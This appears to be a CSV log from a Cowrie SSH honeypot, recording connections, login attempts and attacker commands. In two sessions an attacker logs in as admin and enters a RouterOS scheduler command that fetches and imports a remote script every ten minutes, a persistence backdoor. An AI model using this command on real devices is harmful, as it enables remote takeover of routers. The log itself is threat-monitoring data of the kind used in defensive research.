eventid,timestamp,src_ip,dst_ip,session,duration,message
cowrie.session.connect,2021-02-12 10:51:11.892235+00:00,146.64.171.59,155.232.195.82,764f287c8bd8,,New connection: 146.64.171.59:32485 (155.232.195.82:2222) [session: 764f287c8bd8]
cowrie.client.version,2021-02-12 10:51:11.895185+00:00,146.64.171.59,,764f287c8bd8,,Remote SSH version: b'SSH-2.0-PuTTY_Release_0.74'
cowrie.client.kex,2021-02-12 10:51:11.898078+00:00,146.64.171.59,,764f287c8bd8,,SSH client hassh fingerprint: e77c2db7432e8cfbc42a96909a84fc8e
cowrie.session.connect,2021-02-12 10:52:13.602917+00:00,146.64.171.59,155.232.195.82,052c8cf63071,,New connection: 146.64.171.59:32499 (155.232.195.82:2222) [session: 052c8cf63071]
cowrie.client.version,2021-02-12 10:52:13.604231+00:00,146.64.171.59,,052c8cf63071,,Remote SSH version: b'SSH-2.0-PuTTY_Release_0.74'
cowrie.client.kex,2021-02-12 10:52:13.609347+00:00,146.64.171.59,,052c8cf63071,,SSH client hassh fingerprint: e77c2db7432e8cfbc42a96909a84fc8e
cowrie.login.success,2021-02-12 10:52:21.607296+00:00,146.64.171.59,,052c8cf63071,,login attempt [lpw/hello] succeeded
cowrie.client.size,2021-02-12 10:52:21.686770+00:00,146.64.171.59,,052c8cf63071,,Terminal Size: 80 24
cowrie.session.params,2021-02-12 10:52:21.697407+00:00,146.64.171.59,,052c8cf63071,,[]
cowrie.command.input,2021-02-12 10:52:26.678540+00:00,146.64.171.59,,052c8cf63071,,CMD: ls
cowrie.command.input,2021-02-12 10:52:29.215098+00:00,146.64.171.59,,052c8cf63071,,CMD: exit
cowrie.log.closed,2021-02-12 10:52:29.217457+00:00,146.64.171.59,,052c8cf63071,7.5294365882873535,Closing TTY Log: var/lib/cowrie/tty/b373fccc4859a5456245f7245d53feb68592a9179d484bf04fe49865919c9b05 after 7 seconds
cowrie.session.closed,2021-02-12 10:52:29.220584+00:00,146.64.171.59,,052c8cf63071,15.61643385887146,Connection lost after 15 seconds
cowrie.session.connect,2021-02-12 10:52:36.442704+00:00,146.64.171.59,155.232.195.82,defb6d5f6658,,New connection: 146.64.171.59:32505 (155.232.195.82:2222) [session: defb6d5f6658]
cowrie.client.version,2021-02-12 10:52:36.444708+00:00,146.64.171.59,,defb6d5f6658,,Remote SSH version: b'SSH-2.0-PuTTY_Release_0.74'
cowrie.client.kex,2021-02-12 10:52:36.447469+00:00,146.64.171.59,,defb6d5f6658,,SSH client hassh fingerprint: e77c2db7432e8cfbc42a96909a84fc8e
cowrie.session.closed,2021-02-12 10:52:41.723780+00:00,146.64.171.59,,defb6d5f6658,5.2795090675354,Connection lost after 5 seconds
cowrie.session.closed,2021-02-12 10:53:11.924818+00:00,146.64.171.59,,764f287c8bd8,120.03089618682861,Connection lost after 120 seconds
cowrie.session.connect,2021-02-12 10:56:48.043875+00:00,103.210.50.128,155.232.195.83,a78cba0a3d39,,New connection: 103.210.50.128:63530 (155.232.195.83:2222) [session: a78cba0a3d39]
cowrie.session.connect,2021-02-12 10:56:48.045286+00:00,103.210.50.128,155.232.195.82,2740d76ac02a,,New connection: 103.210.50.128:63531 (155.232.195.82:2222) [session: 2740d76ac02a]
cowrie.session.closed,2021-02-12 10:56:53.607360+00:00,103.210.50.128,,2740d76ac02a,5.560997486114502,Connection lost after 5 seconds
cowrie.session.closed,2021-02-12 10:56:53.608760+00:00,103.210.50.128,,a78cba0a3d39,5.563720941543579,Connection lost after 5 seconds
cowrie.session.connect,2021-02-12 10:57:03.658949+00:00,103.210.50.128,155.232.195.83,493551921d7e,,New connection: 103.210.50.128:64443 (155.232.195.83:2222) [session: 493551921d7e]
cowrie.client.version,2021-02-12 10:57:03.660612+00:00,103.210.50.128,,493551921d7e,,Remote SSH version: b'SSH-2.0-Go'
cowrie.session.connect,2021-02-12 10:57:03.838898+00:00,103.210.50.128,155.232.195.82,112d448ef299,,New connection: 103.210.50.128:64393 (155.232.195.82:2222) [session: 112d448ef299]
cowrie.client.kex,2021-02-12 10:57:03.992772+00:00,103.210.50.128,,493551921d7e,,SSH client hassh fingerprint: 98ddc5604ef6a1006a2b49a58759fbe6
cowrie.client.version,2021-02-12 10:57:04.593223+00:00,103.210.50.128,,112d448ef299,,Remote SSH version: b'SSH-2.0-Go'
cowrie.client.kex,2021-02-12 10:57:04.594216+00:00,103.210.50.128,,112d448ef299,,SSH client hassh fingerprint: 98ddc5604ef6a1006a2b49a58759fbe6
cowrie.login.success,2021-02-12 10:57:08.692890+00:00,103.210.50.128,,493551921d7e,,login attempt [admin/] succeeded
cowrie.session.params,2021-02-12 10:57:11.978850+00:00,103.210.50.128,,493551921d7e,,[]
cowrie.command.input,2021-02-12 10:57:11.979703+00:00,103.210.50.128,,493551921d7e,,"CMD: /system scheduler add name=""U6"" interval=10m on-event=""/tool fetch url=http://myfrance.xyz/poll/e2d78435-b0e9-4ddf-a35a-1f5641895e61 mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc"" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write"
cowrie.command.failed,2021-02-12 10:57:11.980829+00:00,103.210.50.128,,493551921d7e,,"Command not found: /system scheduler add name=U6 interval=10m on-event=/tool fetch url=http://myfrance.xyz/poll/e2d78435-b0e9-4ddf-a35a-1f5641895e61 mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write"
cowrie.log.closed,2021-02-12 10:57:12.371371+00:00,103.210.50.128,,493551921d7e,0.39269733428955,Closing TTY Log: var/lib/cowrie/tty/c2342a28c632bd274bc08c0a81feada5ab854a688d72c5746c9203b3c4f13721 after 0 seconds
cowrie.login.success,2021-02-12 10:57:12.373372+00:00,103.210.50.128,,112d448ef299,,login attempt [admin/] succeeded
cowrie.session.closed,2021-02-12 10:57:12.692615+00:00,103.210.50.128,,493551921d7e,9.032105922698975,Connection lost after 9 seconds
cowrie.session.params,2021-02-12 10:57:13.132710+00:00,103.210.50.128,,112d448ef299,,[]
cowrie.command.input,2021-02-12 10:57:13.133651+00:00,103.210.50.128,,112d448ef299,,"CMD: /system scheduler add name=""U6"" interval=10m on-event=""/tool fetch url=http://strtbiz.site/poll/5b4f15b6-adb1-4ee2-ae1b-8ced0f319b28 mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc"" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write"
cowrie.command.failed,2021-02-12 10:57:13.134765+00:00,103.210.50.128,,112d448ef299,,"Command not found: /system scheduler add name=U6 interval=10m on-event=/tool fetch url=http://strtbiz.site/poll/5b4f15b6-adb1-4ee2-ae1b-8ced0f319b28 mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write"
cowrie.log.closed,2021-02-12 10:57:17.424970+00:00,103.210.50.128,,112d448ef299,4.2924158573150635,Closing TTY Log: var/lib/cowrie/tty/5929c45db43f906f72e4dd76c0fea2035b6494ffc4183281c90bc36d99fe2e8e after 4 seconds
cowrie.session.closed,2021-02-12 10:57:17.755093+00:00,103.210.50.128,,112d448ef299,13.91471242904663,Connection lost after 13 seconds
cowrie.session.connect,2021-02-12 10:59:14.172930+00:00,46.101.170.78,155.232.195.82,364648283d0b,,New connection: 46.101.170.78:50948 (155.232.195.82:2222) [session: 364648283d0b]
cowrie.session.closed,2021-02-12 10:59:14.362543+00:00,46.101.170.78,,364648283d0b,0.18848180770874,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 10:59:20.902896+00:00,46.101.170.78,155.232.195.82,1da48911778b,,New connection: 46.101.170.78:47804 (155.232.195.82:2222) [session: 1da48911778b]
cowrie.client.version,2021-02-12 10:59:20.904651+00:00,46.101.170.78,,1da48911778b,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.kex,2021-02-12 10:59:21.106878+00:00,46.101.170.78,,1da48911778b,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.failed,2021-02-12 10:59:21.933842+00:00,46.101.170.78,,1da48911778b,,login attempt [root/root] failed
cowrie.session.closed,2021-02-12 10:59:23.137967+00:00,46.101.170.78,,1da48911778b,2.233448982238769,Connection lost after 2 seconds
